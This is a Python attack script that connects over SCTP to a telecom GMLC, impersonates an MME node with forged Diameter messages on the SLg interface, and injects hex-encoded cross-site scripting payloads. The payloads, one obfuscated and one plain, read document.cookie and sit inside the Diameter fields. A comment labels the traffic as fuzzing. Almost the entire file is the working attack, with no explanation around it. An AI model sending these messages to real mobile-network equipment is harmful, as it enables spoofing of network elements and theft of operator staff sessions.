#!/usr/bin/env python

import socket
import sctp
import binascii
import sys
import time
#per provare in locale: sudo ncat --sctp -l -p 3868
#source ip 192.168.113.212 #as a MME Client. IP used: IP A
#destination 192.168.113.210 ~IP GMLC
#AVP ORIGIN HOST: pta123_mme.tim.it
#AVP Origin realm: tim.it
#interface 3GPP SLg
#sudo insmod /lib/modules/3.6.11-4.fc16.i686/kernel/lib/libcrc32c.ko
#sudo insmod /lib/modules/3.6.11-4.fc16.i686/kernel/net/sctp/sctp.ko
#echo 1 > /proc/sys/net/sctp/max_init_retransmits

ip = sys.argv[1]

s = sctp.sctpsocket_tcp(socket.AF_INET)
s.connect((str(ip),3868))
s.send(binascii.unhexlify("010000a0800001010000000034d1cff80011779f00000108400000197074613132335f6d6d652e74696d2e6974000000000001284000000e74696d2e697400000000010d0000000b50544100000001014000000e0001c0a871d400000000010a4000000c000028af000001094000000c000028af000001024000000c0100002700000104400000200000010a4000000c000028af000001024000000c01000027"))
time.sleep(1)
#  222015703526741
# 2922107530257614
#frame 16138 pcap gmlc fuzzy
s.send(binascii.unhexlify("010000f8c080000d010000270000002e2b5b406200000108400000197074613132335f6d6d652e74696d2e6974000000000001284000000e74696d2e69740000000001070000005e3c494d472532305352433d272532362532337836613b6176617363253236253233303030303130726970743a612532362532337836633b65727428646f63756d656e742e2532362532337836333b6f6f6b696529273e0000000001150000000c000000010000011b000000373c494d472532305352433d276a6176617363726970743a616c65727428646f63756d656e742e636f6f6b696529273e0000000001000000122623303030303036303b0000"))
time.sleep(10)

#s.send(binascii.unhexlify("010000f8c080000d010000270000002e2b5b406200000108400000197074613132335f6d6d652e74696d2e6974000000000001284000000e74696d2e69740000000001070000005e3c494d472532305352433d272532362532337836613b6176617363253236253233303030303130726970743a612532362532337836633b65727428646f63756d656e742e2532362532337836333b6f6f6b696529273e0000000001150000000c000000010000011b000000373c494d472532305352433d276a6176617363726970743a616c65727428646f63756d656e742e636f6f6b696529273e0000000001000000122623303030303036303b0000"))
#time.sleep(5)
#s.send(binascii.unhexlify("010000f8c080000d010000270000002e2b5b406200000108400000197074613132335f6d6d652e74696d2e6974000000000001284000000e74696d2e69740000000001070000005e3c494d472532305352433d272532362532337836613b6176617363253236253233303030303130726970743a612532362532337836633b65727428646f63756d656e742e2532362532337836333b6f6f6b696529273e0000000001150000000c000000010000011b000000373c494d472532305352433d276a6176617363726970743a616c65727428646f63756d656e742e636f6f6b696529273e0000000001000000122623303030303036303b0000"))
#time.sleep(20)
s.close()
